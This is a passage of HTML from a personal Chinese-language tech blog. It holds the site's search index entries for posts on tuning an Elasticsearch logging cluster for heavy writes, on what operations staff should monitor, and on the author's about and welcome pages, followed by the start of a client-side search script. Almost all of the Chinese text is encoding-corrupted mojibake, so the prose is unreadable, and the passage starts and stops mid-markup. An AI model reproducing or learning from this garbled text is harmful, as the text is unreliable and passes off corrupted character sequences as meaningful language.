&lt;p&gt;å‘ç´¢å¼•ä¸­æ’å…¥æ•°æ®æ—¶ï¼Œæ–‡æ¡£é¦–å…ˆè¢«ä¿å­˜åœ¨å†…å­˜ç¼“å­˜ï¼ˆin-memory bufferï¼‰ä¸­ï¼ŒåŒæ—¶å°†æ“ä½œå†™å…¥åˆ°translogä¸­ï¼Œæ­¤æ—¶è¿™æ¡åˆšæ’å…¥çš„æ–‡æ¡£è¿˜ä¸èƒ½è¢«æœç´¢åˆ°ã€‚é»˜è®¤1ç§’é’Ÿrefreshä¸€æ¬¡ï¼Œrefreshæ“ä½œä¼šå°†æ–‡ä»¶å†™åˆ°æ“ä½œç³»ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿç¼“å­˜ä¸­ï¼Œå¹¶å½¢æˆä¸€ä¸ªsegmentï¼Œrefreshåæ–‡æ¡£å¯ä»¥è¢«æ£€ç´¢åˆ°ã€‚&lt;br&gt;
å½“flushçš„æ—¶å€™ï¼Œæ‰€æœ‰segmentè¢«åŒæ­¥åˆ°ç£ç›˜ï¼ŒåŒæ—¶æ¸…ç©ºtranslogï¼Œç„¶åç”Ÿæˆä¸€ä¸ªæ–°çš„translog,LuceneæŠŠæ¯æ¬¡ç”Ÿæˆçš„å€’æ’ç´¢å¼•å«åšä¸€ä¸ªsegmentï¼Œä¹Ÿå°±æ˜¯è¯´ä¸€ä¸ªsegmentå°±æ˜¯ä¸€ä¸ªå€’æ’ç´¢å¼•&lt;/p&gt;
&lt;p&gt;##æ—¥å¿—æ ¼å¼ä¼˜åŒ–:&lt;br&gt;
æ—¥å¿—æ ¼å¼/å­—æ®µï¼š&lt;br&gt;
æ—¥å¿—æ ¼å¼ç»Ÿä¸€é‡‡JSONï¼Œä¾¿äº ELK è§£æå¤„ç†ã€‚æ—¥å¿—ä¸­çš„å„ä¸ªå­—æ®µçš„å€¼ï¼Œéƒ½åº”è¯¥å°½é‡ä½¿ç”¨ è‹±æ–‡ ï¼Œä¸ä½¿ç”¨ä¸­æ–‡ã€‚&lt;br&gt;
æ—¥å¿—å…·ä½“å­—æ®µï¼šåˆ†ä¸º åŸºç¡€æ•°æ® + æ‰©å±•æ•°æ®ã€‚åŸºç¡€æ•°æ®ï¼Œæ˜¯åº•å±‚æ—¥å¿—æ¡†æ¶è‡ªå¸¦çš„ï¼Œæ‰€æœ‰æ—¥å¿—éƒ½éœ€åŒ…å«ã€‚æ‰©å±•æ•°æ®ï¼Œä¸åŒç±»å‹çš„æ—¥å¿—ï¼ŒåŒ…å«ä¸åŒçš„å­—æ®µ&lt;br&gt;
æ—¥å¿—åŸºç¡€æ•°æ®ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;hostname: string  ä¸»æœºå&lt;/li&gt;
&lt;li&gt;hostipï¼šstring   ä¸»æœºip&lt;/li&gt;
&lt;li&gt;timestampï¼šdate  æ—¥å¿—äº§ç”Ÿæ—¶é—´(UTC æ ¼å¼çš„æ—¥æœŸ)&lt;/li&gt;
&lt;li&gt;moduleï¼šstring  æœåŠ¡åç§°&lt;/li&gt;
&lt;li&gt;retï¼šint  çŠ¶æ€ç &lt;/li&gt;
&lt;li&gt;cluster_tagï¼šstring   é›†ç¾¤åŒºåˆ†(ç¯å¢ƒå˜é‡$RUNENV)&lt;/li&gt;
&lt;li&gt;calltimeï¼šint è€—æ—¶&lt;br&gt;
æ³¨æ„:åŸºç¡€å­—æ®µå¯å…¨éƒ¨åŒ…å«ä½†å¿…é¡»æœ‰å¯å›Šæ‹¬å­—æ®µ(å¦‚retæˆ–calltime)&lt;br&gt;
æ—¥å¿—æ‰©å±•æ•°æ®:&lt;/li&gt;
&lt;li&gt;req\respç­‰è¯·æ±‚ä½“ï¼Œæ‰©å±•å­—æ®µ: TODO,éœ€ä½äºjsonç¬¬ä¸€å±‚å­—æ®µ&lt;/li&gt;
&lt;li&gt;statç±»å‹æ—¥å¿—ï¼Œæ‰©å±•å­—æ®µ: {  perf: {rss:xxx, oss:xxx} }&lt;/li&gt;
&lt;li&gt;pipeç±»å‹æ—¥å¿—ï¼Œæ‰©å±•å­—æ®µ: [ log:{rss:xxx, oss:xxx} ]&lt;/li&gt;
&lt;li&gt;ä¸å¸¦æœ‰typeå­—æ®µä¸logstashå†²çªå¯¼è‡´æ—¥å¿—å†™å…¥å¤±è´¥&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;å†™å…¥é“¾è·¯ä¼˜åŒ–&#34;&gt;å†™å…¥é“¾è·¯ä¼˜åŒ–:&lt;/h2&gt;
&lt;p&gt;å»é™¤å†™å…¥å¤šä½™å­—æ®µå¦‚ï¼šreq\repç­‰&lt;br&gt;
å‹ç¼©æ— éœ€ç´¢å¼•å­—æ®µ,åšåºåˆ—åŒ–è½¬ä¹‰å‹ç¼©:å¦‚&lt;br&gt;
&amp;quot;log&amp;quot;: &amp;quot;[{&amp;quot;calltime&amp;quot;:5,&amp;quot;methodName&amp;quot;:&amp;quot;getStartNode&amp;quot;,&amp;quot;reqArgs&amp;quot;:[&amp;quot;5ee0fd60&amp;quot;,&amp;quot;START&amp;quot;],&amp;quot;result&amp;quot;:{&amp;quot;audioUrl&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;å¼€å§‹&amp;quot;,&amp;quot;nodeId&amp;quot;:1,&amp;quot;replyContent&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;toNodeIds&amp;quot;:[2],&amp;quot;type&amp;quot;:&amp;quot;start&amp;quot;}},{&amp;quot;calltime&amp;quot;:6,&amp;quot;methodName&amp;quot;:&amp;quot;getNodeById&amp;quot;,&amp;quot;reqArgs&amp;quot;:[&amp;quot;5ee0fd60&amp;quot;,2],&amp;quot;result&amp;quot;:{&amp;quot;audioUrl&amp;quot;:&amp;quot;http://aiui.xfyun.cn/index-aiui&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;æ‘˜æœºé—®å€™&amp;quot;,&amp;quot;nodeId&amp;quot;:2,&amp;quot;replyContent&amp;quot;:&amp;quot;æ‘˜æœºé—®å€™&amp;quot;,&amp;quot;toNodeIds&amp;quot;:[3],&amp;quot;type&amp;quot;:&amp;quot;robot&amp;quot;}},{&amp;quot;calltime&amp;quot;:4,&amp;quot;methodName&amp;quot;:&amp;quot;getNodeById&amp;quot;,&amp;quot;reqArgs&amp;quot;:[&amp;quot;5ee0fd60&amp;quot;,3],&amp;quot;result&amp;quot;:{&amp;quot;audioUrl&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;ç”¨æˆ·ä»»æ„è¯´&amp;quot;,&amp;quot;nodeId&amp;quot;:3,&amp;quot;replyContent&amp;quot;:&amp;quot;&amp;quot;,&amp;quot;toNodeIds&amp;quot;:[4],&amp;quot;type&amp;quot;:&amp;quot;popple&amp;quot;}},{&amp;quot;calltime&amp;quot;:4,&amp;quot;methodName&amp;quot;:&amp;quot;getNextAnswerNodes&amp;quot;,&amp;quot;reqArgs&amp;quot;:[&amp;quot;5ee0fd60&amp;quot;,{&amp;quot;audioUrl&amp;quot;:&amp;quot;http://aiui.xfyun.cn/index-aiui&amp;quot;,&amp;quot;name&amp;quot;:&amp;quot;æ‘˜æœºé—®å€™&amp;quot;,&amp;quot;nodeId&amp;quot;:2,&amp;quot;replyContent&amp;quot;:&amp;quot;æ‘˜æœºé—®å€™&amp;quot;,&amp;quot;toNodeIds&amp;quot;:[3],&amp;quot;type&amp;quot;:&amp;quot;robot&amp;quot;}],&amp;quot;result&amp;quot;:[4]}]&amp;quot;,&lt;/p&gt;
&lt;h1 id=&#34;es-clusteré›†ç¾¤ä¼˜åŒ–&#34;&gt;Es clusteré›†ç¾¤ä¼˜åŒ–:&lt;/h1&gt;
&lt;h2 id=&#34;æœºå™¨éƒ¨ç½²&#34;&gt;æœºå™¨éƒ¨ç½²:&lt;/h2&gt;
&lt;p&gt;æ—¥å¿—æ•°æ®éä¸šåŠ¡é‡è¦å¯ä»¥è¯•è¯•RAID0,å†™å…¥æ€§èƒ½ç›¸å¯¹RAID1å¯ä»¥æå‡25-30%&lt;/p&gt;
&lt;h2 id=&#34;é’ˆå¯¹translogä¼˜åŒ–&#34;&gt;é’ˆå¯¹translogä¼˜åŒ–:&lt;/h2&gt;
&lt;p&gt;translog.flush_threshold_sizeï¼š 1024mb&lt;br&gt;
translog.durability ==&amp;gt;asyncå¼‚æ­¥æ–¹å¼åŒæ­¥&lt;/p&gt;
&lt;h2 id=&#34;ç´¢å¼•åˆ·æ–°ä¼˜åŒ–&#34;&gt;ç´¢å¼•åˆ·æ–°ä¼˜åŒ–&lt;/h2&gt;
&lt;p&gt;éƒ¨åˆ†ç´¢å¼•éå®æ—¶æœç´¢.æƒ³ä¼˜åŒ–ç´¢å¼•é€Ÿåº¦è€Œä¸æ˜¯è¿‘å®æ—¶æœç´¢,é™ä½ç´¢å¼•çš„åˆ·æ–°é¢‘ç‡&lt;br&gt;
&amp;quot;refresh_interval&amp;quot;: &amp;quot;30s&amp;quot;&lt;/p&gt;
&lt;h2 id=&#34;åˆ†ç‰‡å‰¯æœ¬ä¼˜åŒ–&#34;&gt;åˆ†ç‰‡å‰¯æœ¬ä¼˜åŒ–&lt;/h2&gt;
&lt;p&gt;åˆ†ç‰‡å’Œå‰¯æœ¬:é’ˆå¯¹å¤§ç´¢å¼•+é«˜å†™å…¥+å­˜å‚¨å¤§å°å¤§äº150GB&lt;br&gt;
number_of_shards 10&lt;br&gt;
number_of_replicas 1 or 0&lt;br&gt;
æ ¹æ®ç´¢å¼•çš„é‡è¦ç¨‹åº¦+æŸ¥è¯¢é€Ÿåº¦è¦æ±‚ æœ‰æ— å‰¯æœ¬&lt;/p&gt;
&lt;p&gt;é«˜å†™å…¥+å­˜å‚¨å¤§å°å¤§äº150GB + ä½æŸ¥è¯¢é€Ÿåº¦ æœ‰äº›æ— å‰¯æœ¬ å¹¶ä¸”åˆ†ç‰‡ ç•¥å°äºèŠ‚ç‚¹æ•°&lt;/p&gt;
&lt;h2 id=&#34;å¢å¤§é™æ€é…ç½®å‚æ•°&#34;&gt;å¢å¤§é™æ€é…ç½®å‚æ•°&lt;/h2&gt;
&lt;p&gt;indices.memory.index_buffer_size (é»˜è®¤10%)&lt;br&gt;
ç¤ºä¾‹:ç´¢å¼•10shards,1å‰¯æœ¬,æ—¥çº¦3.6äº¿æ¡ï¼Œå­˜å‚¨é‡1Tå·¦å³,è®¾ç½®æˆ30%æé«˜äº†çº¦10%å†™å…¥æ€§èƒ½&lt;/p&gt;
&lt;h2 id=&#34;é¿å…å‡ºç°çƒ­ç‚¹èŠ‚ç‚¹&#34;&gt;é¿å…å‡ºç°çƒ­ç‚¹èŠ‚ç‚¹&lt;/h2&gt;
&lt;p&gt;routing.allocation.total_shards_per_node&amp;quot;:&amp;quot;2&amp;quot;&lt;/p&gt;
&lt;h2 id=&#34;è°ƒæ•´bulkçº¿ç¨‹æ± å’Œé˜Ÿåˆ—&#34;&gt;è°ƒæ•´bulkçº¿ç¨‹æ± å’Œé˜Ÿåˆ—&lt;/h2&gt;
&lt;h2 id=&#34;éƒ¨åˆ†é«˜é¢‘ç´¢å¼•è‡ªå»ºtemplates&#34;&gt;éƒ¨åˆ†é«˜é¢‘ç´¢å¼•è‡ªå»ºtemplatesï¼š&lt;/h2&gt;
&lt;p&gt;å†™å…¥ä½“è¾ƒå¤§çš„ç´¢å¼•,å¦‚æŸæ¡æ—¥å¿—æ¥è¿‘ä¸Šåƒè¡Œ,ä¸å»ºè®®å¾€esä¸­è¿›è¡Œå†™å…¥,å› å­—æ®µè¾ƒå¤šï¼Œæˆ–è€…æ—¥å¿—ä½“ä¸­å«æœ‰æ— æ³•è§£æçš„jsonä½“æˆ–è€…dictä½“ã€‚è™½ç„¶ç¬¬ä¸€å±‚å­—æ®µç±»å‹è¢«å®šä¹‰ä¸ºtextæˆ–è€…æ•°ç»„ä½“ã€‚ä½†æ˜¯å†…éƒ¨å­—æ®µè¿˜æ˜¯ä¼šè¢«åˆ†ç¦»ï¼Œè¢«mapping.åç»­å¤§é‡æ—¥å¿—å†™å…¥çš„æ—¶å€™å°±ä¼šè¿›è¡Œå¤§é‡çš„mapping,æ—¥å¿—é‡å’Œæ—¥å¿—ä½“éƒ½è¿‡å¤§æˆ–å¯¼è‡´mergeçš„æ—¶å€™è€—æ—¶é«˜ï¼ŒåŒæ—¶è¿›è¡Œæ–°æ—§gcçš„æ—¶å€™ä¹Ÿä¼šè€—æ—¶å¾ˆå¤§ã€‚ä¹Ÿå®¹æ˜“å¯¼è‡´èŠ‚ç‚¹oom&lt;/p&gt;
&lt;h1 id=&#34;æŸ¥è¯¢ä¼˜åŒ–&#34;&gt;æŸ¥è¯¢ä¼˜åŒ–:&lt;/h1&gt;
&lt;p&gt;1.é€šè¿‡ç›‘æ§åˆ†æç¡®å®šESé›†ç¾¤èŠ‚ç‚¹è´Ÿè½½,å¯¹é«˜è´Ÿè½½èŠ‚ç‚¹åšå®šå‘ç´¢å¼•åˆ†è§£å’Œå¿…è¦æ—¶é‡å¯æ•£å‹åŠ›æ“ä½œ&lt;br&gt;
2.å‡ºç°çƒ­ç‚¹èŠ‚ç‚¹å¯è¯•å›¾é€šè¿‡Cerebro æˆ–è€…è‡ªèº«es-headè¿›è¡Œç´¢å¼•åˆ†ç‰‡è°ƒæ•´&lt;br&gt;
3.æŸ¥è¯¢æ—¶å°½é‡å‹¿é€‰æ‹©æ—¶é—´é•¿ã€é€šé…å­—ç¬¦æŸ¥è¯¢ã€åˆ†ç‰‡æ•°é‡å¤§&lt;/p&gt;
&lt;h1 id=&#34;æ€»ç»“è¿‡ç¨‹&#34;&gt;æ€»ç»“è¿‡ç¨‹&lt;/h1&gt;
&lt;p&gt;è§„èŒƒæ—¥å¿—å†™å…¥æ ¼å¼ã€æ—¥å¿—å†™å…¥å‰è¿›è¡Œåºåˆ—åŒ–ã€å›ºåŒ–æ—¥å¿—å†…å›ºå®šå­—æ®µç”¨äºåç»­å‘Šè­¦&lt;br&gt;
å‡çº§æ—¥å¿—é›†ç¾¤ç‰ˆæœ¬å’Œæ–°çš„å‘Šè­¦å¯¹é½ã€æ—¥å¿—æœºå™¨ç»Ÿä¸€åŒ–ã€æ¨¡æ¿åŒ–ã€é›†ç¾¤æ•°æ®èŠ‚ç‚¹/åè°ƒèŠ‚ç‚¹åˆ†ç¦»&lt;br&gt;
ä¼˜åŒ–é›†ç¾¤é…ç½®ï¼šè°ƒæ•´çº¿ç¨‹æ± å’Œé˜Ÿåˆ—ã€translogå¼‚æ­¥ä¼˜åŒ–ã€ç´¢å¼•ç­‰çº§åˆ·æ–°ä¼˜åŒ–ã€ç´¢å¼•åˆ†ç±»å‰¯æœ¬ä¼˜åŒ–ã€ç´¢å¼•&lt;br&gt;
ä¼˜åŒ–å†™å…¥é“¾è·¯:å»é™¤å†™å…¥å¤šä½™å­—æ®µ(req/respç­‰)ã€å‹ç¼©å­—æ®µå†…éƒ¨å­—å…¸/æ•°ç»„æ—¥å¿—ã€åšæ€§èƒ½æ—¥å¿—çš„è€—æ—¶ä¸¢å¼ƒã€æŒ‰ç…§ç‰¹å®šè§„åˆ™åˆ†å‰²&lt;br&gt;
ç´¢å¼•ä¼˜åŒ–éƒ¨åˆ†é‡è¦ç´¢å¼•ä¼˜åŒ–å‰¯æœ¬ã€è‡ªå»ºtemplatesã€å®šä¹‰å¥½mappingè§„åˆ™&lt;br&gt;
æŸ¥è¯¢ä¼˜åŒ–: çƒ­ç‚¹æ•°æ®è¿›è¡Œå†…å­˜ç¼“å­˜å¿«é€ŸæŸ¥è¯¢ï¼Œé›†ç¾¤éƒ¨åˆ†èŠ‚ç‚¹åšå†·æ•°æ®å­˜å‚¨,å¤§äº3å¤©çš„æ•°æ®æŠ›å…¥å†·èŠ‚ç‚¹ï¼Œ&lt;br&gt;
æ¶ˆè´¹ä¼˜åŒ–: æ¨¡æ¿åŒ–å•keyæ¶ˆè´¹æ¨¡æ¿ä¸cicdæ‰“é€š,ç”±ç‰©ç†æœºå¤šæœºå™¨éƒ¨ç½²å‡çº§è‡³å®¹å™¨åŒ–éƒ¨ç½²&lt;br&gt;
ç¼“å­˜ä¼˜åŒ–ï¼šå› ç¼“å­˜ç»„ä»¶æ— æ³•æ›´æ¢ï¼Œç”±å•èŠ‚ç‚¹rediså‡çº§è‡³temproxyå¤šèŠ‚ç‚¹åˆ†å‘ï¼Œé’ˆå¯¹redisç¼“å­˜é˜Ÿåˆ—é…ç½®å’Œå†™å…¥é—®é¢˜åšäº†ä¼˜åŒ–&lt;/p&gt;
&lt;h1 id=&#34;æ€»ç»“&#34;&gt;æ€»ç»“:&lt;/h1&gt;
&lt;p&gt;1.å¦‚æœæœ‰èƒ½åŠ›ä¸ŠSSD+å†…å­˜å¤§å°å¤§äºæ•°æ®60%,å¯ä»¥å¿½ç•¥ä¸Šè¿°æ‰€æœ‰&lt;br&gt;
2.å¦‚æœé’ˆå¯¹ç£ç›˜æ€§èƒ½é—®é¢˜å¯ä»¥è¯•è¯•ç£ç›˜ç¡¬ä»¶æ–¹é¢RAID0&lt;br&gt;
3.æ•´ä½“é“¾è·¯ä¼˜åŒ–éœ€è¦ä»å…¥å£ã€è¿‡æ»¤ã€å†™å…¥éƒ½éœ€è¦è¿›è¡Œä¼˜åŒ–&lt;br&gt;
4.æœ€å¥½çš„ä¼˜åŒ–æ–¹æ³•æ˜¯ç®€äºå½¢,è§„äºå¿ƒ&lt;/p&gt;
">å¦‚ä½•é’ˆå¯¹é«˜å†™å…¥ä½æŸ¥è¯¢esé›†ç¾¤ä¼˜åŒ–</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://amendge.github.io/post/jian-kong-jian-kong-dao-di-yao-jian-kong-na-xie-dong-xi/"" data-c="
          &lt;p&gt;ğŸ˜å¯¹äºè¿ç»´æ¥è¯´ï¼Œè€ç”Ÿå¸¸è°ˆçš„å°±æ˜¯ç›‘æ§.&lt;br&gt;
é‚£ä¹ˆæˆ‘ä»¬è¯¥ç›‘æ§å“ªäº›ä¸œè¥¿æ‰èƒ½æ‰èƒ½åŠæ—¶çš„å‘ç°é—®é¢˜,ä¸ä¼šèƒŒé”…ï¼Œæ‰ä¸ä¼šäº‹åå¼¥è¡¥å‘¢&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h1 id=&#34;åäººåè¨€&#34;&gt;åäººåè¨€&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;ç›‘æ§å¤§æ³•å¥½ï¼Œè°ä¹Ÿè·‘ä¸äº†&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ä¸šåŠ¡æœ‰é—®é¢˜ï¼Œç›‘æ§å¸®åŠ©æ‚¨ï¼&lt;/p&gt;
&lt;p&gt;æ¶æ„æ¢³ç†å›¾:&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617864679339.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;ä»ä»¥ä¸Šå›¾å¯ä»¥çœ‹å‡ºä½œè€…è¿™è¾¹æŠŠç›‘æ§åˆ†ä¸ºä»å…¥å£åˆ°åº•éƒ¨çš„ä¸€ä¸ªåˆ†å±‚:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;æœåŠ¡ç›‘æ§&lt;/li&gt;
&lt;li&gt;ä¸­é—´ä»¶ç›‘æ§&lt;/li&gt;
&lt;li&gt;ä¸šåŠ¡ç›‘æ§&lt;/li&gt;
&lt;li&gt;å…¥å£ç›‘æ§&lt;/li&gt;
&lt;li&gt;æ¥å…¥ç›‘æ§&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;æœåŠ¡ç›‘æ§&#34;&gt;æœåŠ¡ç›‘æ§&lt;/h2&gt;
&lt;p&gt;é’ˆå¯¹æœåŠ¡å™¨çš„åŸºç¡€ç›‘æ§:&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617864869984.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ä¸­é—´ä»¶å®¹å™¨&#34;&gt;ä¸­é—´ä»¶/å®¹å™¨&lt;/h2&gt;
&lt;p&gt;é’ˆå¯¹æœåŠ¡ä¾èµ–ä¸­é—´ä»¶/è½½ä½“ï¼š&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617864887255.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;k8sé›†ç¾¤&#34;&gt;K8Sé›†ç¾¤&lt;/h2&gt;
&lt;p&gt;å½“å‰K8Så·²ç»æœ‰å¾ˆå¤šå…¬å¸ä½¿ç”¨ä¸­,å¯¹äºå®ƒçš„ç›‘æ§ä¹Ÿæ˜¯è‡³å…³é‡è¦&lt;br&gt;
&lt;img src=&#34;https://amendge.github.io/post-images/1617864891752.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;ä¸šåŠ¡ç›‘æ§é›†æˆ&#34;&gt;ä¸šåŠ¡ç›‘æ§(é›†æˆ)&lt;/h2&gt;
&lt;p&gt;å¦‚æœæœ‰å…¬å¸ä½¿ç”¨proemtheusçš„å¯ä»¥è¯•è¯•åœ¨ä¸å½±å“æœåŠ¡æ€§èƒ½çš„æƒ…å†µä¸‹ç»§æ‰¿Prometheuså®¢æˆ·ç«¯ï¼Œå®˜æ–¹æé«˜äº†ä¸åŒè¯­è¨€çš„å®¢æˆ·ç«¯&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;golang&lt;/li&gt;
&lt;li&gt;java(jmx_exporter\pom)&lt;/li&gt;
&lt;li&gt;pythonç­‰ç­‰&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ä¸šåŠ¡ç›‘æ§æ—¥å¿—&#34;&gt;ä¸šåŠ¡ç›‘æ§(æ—¥å¿—)&lt;/h2&gt;
&lt;p&gt;é’ˆå¯¹ç»„ä»¶æ—¥å¿—ç›‘æ§ä¸€èˆ¬éœ€è¦è§„èŒƒæ ¼å¼.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;nginxæ—¥å¿—&lt;/li&gt;
&lt;li&gt;ç»„ä»¶æ—¥å¿—&lt;/li&gt;
&lt;li&gt;è¯·æ±‚æ—¥å¿—&lt;/li&gt;
&lt;li&gt;é“¾è·¯æ—¥å¿—&lt;br&gt;
ä¸€èˆ¬ç»„ä»¶æ—¥å¿—å¸¸ç”¨çŠ¶æ€ç æˆ–è€…è€—æ—¶è¿›è¡Œç›‘æ§ï¼Œè€Œç»„ä»¶ä¸šåŠ¡æ—¥å¿—åŒ…å«å¾ˆå¤šæ•æ„Ÿä¿¡æ¯æˆ–ä¸åŒç±»å‹,å¸¸ç”¨å¤§æ•°æ®èšåˆç»Ÿè®¡ç›‘æ§&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;è°ƒç”¨ç›‘æ§&#34;&gt;è°ƒç”¨ç›‘æ§&lt;/h2&gt;
&lt;p&gt;é’ˆå¯¹ä¸šåŠ¡åšé“¾è·¯æ‹¨æµ‹&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;å…¨é“¾è·¯æ‹¨æµ‹&lt;/li&gt;
&lt;li&gt;é‡ç‚¹å®¢æˆ·æ‹¨æµ‹&lt;/li&gt;
&lt;li&gt;å…¨ä¸šåŠ¡æ¨¡å—æ‹¨æµ‹&lt;/li&gt;
&lt;li&gt;æ ¸å¿ƒç»„ä»¶æ‹¨æµ‹&lt;/li&gt;
&lt;/ul&gt;
">ã€ç›‘æ§ã€‘ç›‘æ§åˆ°åº•è¦ç›‘æ§å“ªäº›ä¸œè¥¿</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://amendge.github.io/post/about/"" data-c="
          &lt;blockquote&gt;
&lt;p&gt;æ¬¢è¿æ¥åˆ°Amendçš„å°ç«™å‘€ï¼Œå¾ˆé«˜å…´é‡è§ä½ ï¼ğŸ¤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;å…³äºæœ¬ç«™&#34;&gt;ğŸ  å…³äºæœ¬ç«™&lt;/h2&gt;
&lt;p&gt;è®°å½•æŠ€æœ¯é’»ç ”çš„è¿‡ç¨‹å’Œç»“æœåˆ†äº«ã€ä¹Ÿå¸Œæœ›å¯ä»¥å¸®åŠ©è‡ªå·±ä½œä¸ºç¬”è®°è®°å½•&lt;/p&gt;
&lt;h2 id=&#34;åšä¸»æ˜¯è°&#34;&gt;ğŸ‘¨â€ğŸ’» åšä¸»æ˜¯è°&lt;/h2&gt;
&lt;p&gt;ä½ éƒ½ä¸çŸ¥é“æˆ‘æ˜¯è°ï¼ŸğŸ’ª ç™¾åº¦ä¸€ä¸‹ğŸ” Amend ä½ ä¼šå‘ç°æˆ‘å•¥ä¹Ÿä¸æ˜¯ï¼&lt;/p&gt;
&lt;h2 id=&#34;å…´è¶£çˆ±å¥½&#34;&gt;â›¹ å…´è¶£çˆ±å¥½&lt;/h2&gt;
&lt;p&gt;1.å–œæ¬¢å¤´è„‘å‘çƒ­ç ”ç©¶æŠ€æœ¯&lt;br&gt;
2.æå…¶é…·çˆ±LOL(ç›®å‰å·²è½¬å‹å›½ç²¹éº»å°†)&lt;br&gt;
3.ç½‘çƒã€ä¿é¾„çƒã€è¶³çƒã€æ’çƒè¿™äº›æˆ‘éƒ½ä¸ä¼š&lt;br&gt;
4.å•¥éƒ½ä¸å¤ªå–œæ¬¢,é™¤äº†åœ¨å®¶&lt;/p&gt;
&lt;h2 id=&#34;è”ç³»æˆ‘å‘€&#34;&gt;ğŸ“¬ è”ç³»æˆ‘å‘€&lt;/h2&gt;
&lt;p&gt;ğŸ’Œ:645158469@qq.com&lt;/p&gt;
">å…³äº</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://amendge.github.io/post/welcome/"" data-c="
          &lt;p&gt;ğŸ‘ æ¬¢è¿ä½¿ç”¨æ¥åˆ°Amendçš„ä¸ªäººåšå®¢ï¼&lt;br&gt;
âœï¸ è¿™é‡Œç”¨æ¥è®°å½•æˆ‘çš„æŠ€æœ¯æ”»ç•¥ã€çŸ¥è¯†ã€ç¬”è®°ã€åˆ›æ„... ...&lt;/p&gt;
&lt;!-- more --&gt;
&lt;h2 id=&#34;talk-is-sheep-show-me-code&#34;&gt;talk is sheep show me codeğŸ‘‡&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/gecailong&#34;&gt;Github&lt;/a&gt;&lt;br&gt;
&lt;a href=&#34;http://www.noalert.cn&#34;&gt;blog&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;ç‰¹æ€§&#34;&gt;ç‰¹æ€§ğŸ‘‡&lt;/h2&gt;
&lt;p&gt;ğŸ“ ä»ä¸šå¹´é™4å¹´&lt;/p&gt;
&lt;p&gt;ğŸŒ‰ ä»ä¸šæ–¹å‘ç›‘æ§ä¸ºä¸»+&lt;/p&gt;
&lt;p&gt;ğŸ·ï¸ æˆ‘çš„æ ‡ç­¾:ç›‘æ§ã€å‘Šè­¦ã€è¿ç»´ã€å°å¸…æ¯”&lt;/p&gt;
&lt;p&gt;ğŸ“‹ è¿™é‡Œå‘¢è®°å½•çš„ä¸ä»…æ˜¯æˆ‘è‡ªèº«çš„é’»ç ”ã€è¿˜æœ‰å¾ˆå¤šå¤§ç¥ä»¬çš„æŠ€æœ¯ç§¯ç´¯&lt;/p&gt;
&lt;p&gt;ğŸ’» å­¦è¿‡python\java\c++\golangï¼Œä½†æ˜¯ç•¥æ‡‚python&lt;/p&gt;
&lt;p&gt;ğŸŒ ä½ å¯ä»¥ä½¿ç”¨ ğ–¦ğ—‚ğ—ğ—ğ—ğ–» ğ–¯ğ–ºğ—€ğ–¾ğ—Œ æˆ– Coding Pages æŸ¥çœ‹æˆ‘çš„åˆ†äº«å’Œåˆ›ä½œæ¥æ”¯æŒä½ çš„å·¥ä½œ&lt;/p&gt;
&lt;p&gt;ğŸŒ± å½“ç„¶æˆ‘è¿˜å¾ˆå¹´è½»ï¼Œæœ‰å¾ˆå¤šä¸è¶³ï¼Œä½†è¯·ç›¸ä¿¡ï¼Œæˆ‘ä¼šä¸åœå‘å‰ ğŸƒ&lt;/p&gt;
&lt;p&gt;æœªæ¥ï¼Œæˆ‘ä¸€å®šä¼šæˆä¸ºä½ ç¦»ä¸å¼€çš„ä¼™ä¼´&lt;/p&gt;
&lt;p&gt;ğŸ˜˜ Enjoy~&lt;/p&gt;
&lt;p&gt;ğŸ˜˜ Enjoy~&lt;/p&gt;
">é¦–åº</a>
      </div>
      
    </div>
    <div class="page">
      <div id="page_ul"></div>
    </div>
  </div>
</div>
<script>
  !function () {
    let searchMask = document.querySelector('#search_mask');
    let result = document.querySelector('#result');
    let items = document.querySelectorAll('.item');
    let searchBox = document.querySelector('#search');
    let statCount = document.querySelector('#stat_count');
    let statTimes = document.querySelector('#stat_times');
    let pageUl = document.querySelector('#page_ul');
    let close = document.querySelector('#close');
    
    close.addEventListener('click', function() {
      searchMask.style = 'display: none;'
    })

    let finds = [];
    let contents = [];
    let pageSize = 10;
    items.forEach(item => {
      let a = item.querySelector('a');
      contents.push({
        title: a.innerText,
        details: a.dataset.c,
        link: a.href
      })
      item.remove();
    })

    function insertStr(soure, start, count) {
      let newStr = soure.substr(start, count);
      return soure.slice(0, start) + '<em>' + newStr + '</em>' + soure.slice(start + count);
    }

